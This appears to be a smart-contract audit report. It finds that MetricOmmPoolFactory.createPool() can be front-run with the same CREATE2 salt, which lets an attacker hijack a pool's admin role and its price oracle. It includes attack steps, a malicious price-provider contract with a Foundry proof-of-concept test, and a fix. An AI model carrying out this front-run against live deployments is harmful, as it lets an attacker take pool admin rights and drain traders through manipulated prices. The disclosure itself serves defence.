### Title
Front-Running `createPool()` With Same `salt` Permanently Hijacks Deterministic Pool Address and Enables Bad-Price Execution - (File: `metric-core/contracts/MetricOmmPoolFactory.sol`)

### Summary
`MetricOmmPoolFactory.createPool()` is explicitly permissionless and accepts a caller-supplied `salt` that is forwarded verbatim to `MetricOmmPoolDeployer.deploy()` as the CREATE2 salt. Because the salt is never bound to `msg.sender`, any attacker who observes a pending `createPool()` transaction in the mempool can front-run it with the same `salt` but substitute an attacker-controlled `admin` and a malicious `priceProvider`. The legitimate creator's transaction reverts with a CREATE2 collision, and the attacker's pool — which passes all factory `isPool()` checks — occupies the deterministic address permanently.

### Finding Description
`PoolParameters.salt` is a raw `bytes32` supplied by the caller with no binding to `msg.sender`:

```solidity
// metric-core/contracts/types/FactoryOperation.sol
struct PoolParameters {
  ...
  bytes32 salt;   // ← fully caller-controlled, no msg.sender component
}
```

`createPool()` passes it directly to the deployer:

```solidity
// MetricOmmPoolFactory.sol L183
pool = MetricOmmPoolDeployer(poolDeployer).deploy(
    MetricOmmPoolDeployer.DeployParams({
        salt: params.salt,   // ← forwarded verbatim
        admin: params.admin,
        priceProvider: params.priceProvider,
        ...
    })
);
```

The deployer uses it as the CREATE2 salt:

```solidity
// MetricOmmPoolDeployer.sol L62
pool = address(new MetricOmmPool{salt: params.salt}(...));
```

The factory interface explicitly documents the function as permissionless:

> `createPool` is permissionless once `poolDeployer` is set (not `onlyOwner`)

Attack steps:
1. Attacker pre-deploys a malicious `PriceProvider` that correctly returns `(token0, token1)` from `token0()`/`token1()` (satisfying `_validatePriceProvider`) but returns attacker-chosen bid/ask prices.
2. Attacker monitors the mempool for a `createPool()` transaction with target `salt`.
3. Attacker submits a `createPool()` with the **same `salt`** and same `token0`/`token1`, but substitutes `admin = attacker` and `priceProvider = maliciousOracle`.
4. Attacker's transaction lands first; the legitimate creator's transaction reverts on the CREATE2 collision.
5. The attacker's pool is registered in `poolAdmin[pool]`, `poolFeeConfig[pool]`, `idxToPool`, and `poolToIdx` — it passes `isPool()` and all factory lookups.
6. Any off-chain infrastructure (routers, quoters, integrators) that pre-computed the pool address via CREATE2 now routes swaps to the attacker's pool.

### Impact Explanation
- **Bad-price execution**: The attacker's `priceProvider` returns manipulated bid/ask prices. Swaps routed to the hijacked address execute at attacker-chosen prices, causing traders to receive less than the oracle curve permits or the pool to receive less than owed input.
- **Admin-boundary break**: The attacker becomes `poolAdmin` of the pool at the expected address. They can set fees to the maximum cap, redirect `adminFeeDestination` to themselves, and pause/unpause the pool — all bypassing the intended admin assignment through an unprivileged front-run.
- **Permanent DoS on the intended salt**: The legitimate creator can never deploy a pool with that salt again; the CREATE2 address is permanently occupied.

### Likelihood Explanation
`createPool()` is permissionless and the `salt` is a plain `bytes32` with no caller binding. Front-running is straightforward on any chain with a public mempool (Ethereum mainnet, Base). The attacker only needs to deploy one malicious `PriceProvider` contract in advance. The attack is repeatable: every new `createPool()` attempt by the legitimate creator with a new salt can be front-run again.

### Recommendation
Bind the salt to `msg.sender` inside `createPool()` before forwarding it to the deployer:

```solidity
bytes32 boundSalt = keccak256(abi.encode(msg.sender, params.salt));
pool = MetricOmmPoolDeployer(poolDeployer).deploy(
    MetricOmmPoolDeployer.DeployParams({
        salt: boundSalt,
        ...
    })
);
```

This ensures that two different callers using the same `params.salt` produce different CREATE2 addresses, eliminating the front-running surface while preserving deterministic address prediction for the legitimate creator (who can compute `keccak256(abi.encode(myAddress, mySalt))` off-chain).

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Attacker pre-deploys this to satisfy _validatePriceProvider
contract MaliciousPriceProvider {
    address public token0;
    address public token1;
    constructor(address t0, address t1) { token0 = t0; token1 = t1; }
    // Returns manipulated prices — e.g., bid == ask == 0 to drain swappers
    function getBidAndAsk() external pure returns (uint128 bid, uint128 ask) {
        return (1, type(uint128).max); // extreme spread
    }
}

// Test scenario (Foundry)
function test_frontrun_createPool_salt_hijack() public {
    bytes32 targetSalt = keccak256("VICTIM_POOL_SALT");

    // Victim prepares params
    PoolParameters memory victimParams = _defaultPoolParams();
    victimParams.salt = targetSalt;
    victimParams.admin = victim;

    // Attacker deploys malicious price provider
    MaliciousPriceProvider malOracle = new MaliciousPriceProvider(
        victimParams.token0, victimParams.token1
    );

    // Attacker front-runs with same salt, different admin + priceProvider
    PoolParameters memory attackerParams = victimParams;
    attackerParams.admin = attacker;
    attackerParams.adminFeeDestination = attacker;
    attackerParams.priceProvider = address(malOracle);

    vm.prank(attacker);
    address hijackedPool = factory.createPool(attackerParams);

    // Victim's transaction now reverts — CREATE2 address already occupied
    vm.prank(victim);
    vm.expectRevert(); // CREATE2 collision
    factory.createPool(victimParams);

    // Attacker is admin of the pool at the expected address
    assertEq(factory.poolAdmin(hijackedPool), attacker);
    assertTrue(factory.isPool(hijackedPool));
}
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** metric-core/contracts/types/FactoryOperation.sol (L7-36)
```text
struct PoolParameters {
  address token0;
  address token1;
  address priceProvider;
  /// @dev Up to seven extension contracts; stored as immutables on the pool in array order.
  address[] extensions;
  /// @dev Per-action extension call orders; each value encodes up to seven 3-bit extension indices.
  ExtensionOrders extensionOrders;
  /// @dev Per-extension initialization calldata; length must match `extensions`.
  bytes[] extensionInitData;
  /// @notice Delay for mutable provider rotation; `type(uint256).max` means immutable provider.
  uint256 priceProviderTimelock;
  address admin;
  /// @notice Token0 density for empty-bin mints: smallest units per one share-unit (`sharesToAdd = 1`),
  ///         scaled by 1e18 in the liquidity formula (`amount = initialAmount0PerShareE18 × shares / 1e18`).
  uint256 initialAmount0PerShareE18;
  /// @notice Token1 density for empty-bin mints: smallest units per one share-unit (`sharesToAdd = 1`),
  ///         scaled by 1e18 in the liquidity formula (`amount = initialAmount1PerShareE18 × shares / 1e18`).
  uint256 initialAmount1PerShareE18;
  uint256 minimalMintableLiquidity;
  /// @notice Admin spread fee component in E6 (`1e6 = 100%`).
  uint24 adminSpreadFeeE6;
  /// @notice Admin notional fee component in E8 (`1e8 = 100%`).
  uint24 adminNotionalFeeE8;
  address adminFeeDestination;
  int24 curBinDistFromProvidedPriceE6;
  uint256[] nonNegativeBinDataArray;
  uint256[] negativeBinDataArray;
  bytes32 salt;
}
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L156-204)
```text
  function createPool(PoolParameters calldata params) external override returns (address pool) {
    if (poolDeployer == address(0)) revert PoolDeployerNotSet();
    _validatePoolParameters(params);
    (uint256 token0ScaleMultiplier, uint256 token1ScaleMultiplier) = _getScaleMultipliers(params.token0, params.token1);
    (BinState[] memory nonNegativeBinStates, BinState[] memory negativeBinStates) = _unpackAndValidateBinStates(
      params.curBinDistFromProvidedPriceE6, params.nonNegativeBinDataArray, params.negativeBinDataArray
    );

    bool immutablePriceProvider = params.priceProviderTimelock == type(uint256).max;

    uint256 initialScaledAmount0PerShareE18 = params.initialAmount0PerShareE18 * token0ScaleMultiplier;
    uint256 initialScaledAmount1PerShareE18 = params.initialAmount1PerShareE18 * token1ScaleMultiplier;
    if (initialScaledAmount0PerShareE18 >= type(uint128).max || initialScaledAmount1PerShareE18 >= type(uint128).max) {
      revert InitialScaledAmountExceedsUint128(initialScaledAmount0PerShareE18, initialScaledAmount1PerShareE18);
    }

    ValidateExtensionsConfig.validateExtensionsConfig(
      params.extensions, params.extensionOrders, params.extensionInitData
    );

    uint24 spreadFeeE6 = uint24(uint256(spreadProtocolFeeE6) + uint256(params.adminSpreadFeeE6));
    uint24 notionalFeeE8 = uint24(uint256(protocolNotionalFeeE8) + uint256(params.adminNotionalFeeE8));
    PoolExtensions memory poolExtensions = _poolExtensionsFromArray(params.extensions);

    pool = MetricOmmPoolDeployer(poolDeployer)
      .deploy(
        MetricOmmPoolDeployer.DeployParams({
        salt: params.salt,
        factory: address(this),
        admin: params.admin,
        adminFeeDestination: params.adminFeeDestination,
        token0: params.token0,
        token1: params.token1,
        priceProvider: params.priceProvider,
        extensions: poolExtensions,
        extensionOrders: params.extensionOrders,
        immutablePriceProvider: immutablePriceProvider,
        token0ScaleMultiplier: token0ScaleMultiplier,
        token1ScaleMultiplier: token1ScaleMultiplier,
        initialScaledAmount0PerShareE18: initialScaledAmount0PerShareE18,
        initialScaledAmount1PerShareE18: initialScaledAmount1PerShareE18,
        minimalMintableLiquidity: params.minimalMintableLiquidity,
        spreadFeeE6: spreadFeeE6,
        curBinDistFromProvidedPriceE6: params.curBinDistFromProvidedPriceE6,
        nonNegativeBinStates: nonNegativeBinStates,
        negativeBinStates: negativeBinStates,
        notionalFeeE8: notionalFeeE8
      })
      );
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L212-225)
```text
    poolAdmin[pool] = params.admin;
    priceProviderTimelock[pool] = params.priceProviderTimelock;
    poolFeeConfig[pool] = PoolFeeConfig({
      protocolSpreadFeeE6: spreadProtocolFeeE6,
      adminSpreadFeeE6: params.adminSpreadFeeE6,
      protocolNotionalFeeE8: protocolNotionalFeeE8,
      adminNotionalFeeE8: params.adminNotionalFeeE8
    });
    poolAdminFeeDestination[pool] = params.adminFeeDestination;

    uint256 poolIdx = nextPoolIdx;
    nextPoolIdx++;
    idxToPool[poolIdx] = pool;
    poolToIdx[pool] = poolIdx;
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L541-546)
```text
  function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
      revert PriceProviderTokenMismatch();
    }
  }
```

**File:** metric-core/contracts/MetricOmmPoolDeployer.sol (L60-84)
```text
  function deploy(DeployParams calldata params) external onlyFactory returns (address pool) {
    pool = address(
      new MetricOmmPool{salt: params.salt}(
        params.factory,
        params.admin,
        params.adminFeeDestination,
        params.token0,
        params.token1,
        params.priceProvider,
        params.extensions,
        params.extensionOrders,
        params.immutablePriceProvider,
        params.token0ScaleMultiplier,
        params.token1ScaleMultiplier,
        params.initialScaledAmount0PerShareE18,
        params.initialScaledAmount1PerShareE18,
        params.minimalMintableLiquidity,
        params.spreadFeeE6,
        params.curBinDistFromProvidedPriceE6,
        params.nonNegativeBinStates,
        params.negativeBinStates,
        params.notionalFeeE8
      )
    );
  }
```
